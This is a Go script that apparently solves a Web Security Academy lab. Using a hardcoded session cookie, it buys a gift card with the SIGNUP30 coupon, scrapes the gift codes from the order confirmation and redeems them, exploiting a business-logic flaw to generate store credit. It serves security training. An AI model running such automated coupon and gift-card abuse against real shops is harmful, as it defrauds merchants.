package main

import (
	"log"
	"net/http"
	"strings"
	"sync"
)

var (
	go_routines = 1

	main_url       = "https://0a2800ed04e7f3ba809bc660003700dc.web-security-academy.net" // should NOT end with "/"
	session_cookie = "fiM6C7sjmuCMyRBJpHxE4vZH8wG2iYnt"
	user           = "wiener"

	csrfTag           = "<input required type=\"hidden\" name=\"csrf\" value=\""
	csrf_token_length = 32

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	var wg sync.WaitGroup

	for i := 0; i < go_routines; i++ {
		wg.Add(1)
		go flow(&wg)
	}

	wg.Wait()
}

func flow(wg *sync.WaitGroup) {
	defer wg.Done()

	// add GiftCardsToCart
	makeHttpReq(http.MethodPost, main_url+"/cart", "productId=2&redir=PRODUCT&quantity=1")

	// get cart
	respBody := makeHttpReq(http.MethodGet, main_url+"/cart", "")
	csrfTok := getCsrf(respBody)

	// apply coupon
	makeHttpReq(http.MethodPost, main_url+"/cart/coupon", "csrf="+csrfTok+"&coupon=SIGNUP30")

	// place order
	makeHttpReq(http.MethodPost, main_url+"/cart/checkout", "csrf="+csrfTok)
	html := makeHttpReq(http.MethodGet, main_url+"/cart/order-confirmation?order-confirmed=true", "")

	// parse html and get GiftCodes out of it
	searchGiftCodesFromIndex := strings.Index(html, "<th>Code</th>")
	htmlContent := html[searchGiftCodesFromIndex:]
	giftCards := getGiftCardsFromHtml(htmlContent)

	// get account page and csrf out of it
	respBody2 := makeHttpReq(http.MethodGet, main_url+"/my-account?id="+user, "")
	csrfTok2 := getCsrf(respBody2)

	// Apply gift cards
	for _, giftCard := range giftCards {
		makeHttpReq(http.MethodPost, main_url+"/gift-card", "csrf="+csrfTok2+"&gift-card="+giftCard)
	}
}

func getCsrf(html string) (csrfTok string) {
	csrfStart := strings.Index(html, csrfTag)
	if csrfStart == -1 {
		log.Fatal("Could not find csrf")
	}

	csrfStart += len(csrfTag)
	csrfEnd := csrfStart + csrf_token_length
	return html[csrfStart:csrfEnd]
}

func getGiftCardsFromHtml(html string) []string {
	var giftCards []string

	filtered := strings.Split(html, "\n")

	for _, row := range filtered {
		if strings.Contains(row, "td") {
			giftCard := getValBetweenTags(row)
			giftCards = append(giftCards, giftCard)
		}
	}

	return giftCards
}

func getValBetweenTags(input string) string {
	startTag := "<td>"
	endTag := "</td>"

	startIndex := strings.Index(input, startTag)
	if startIndex == -1 {
		log.Fatal(" Start tag not found")
	}

	startIndex += len(startTag)
	endIndex := strings.Index(input, endTag)
	if endIndex == -1 {
		log.Fatal(" tag not found")
	}

	return input[startIndex:endIndex]
}
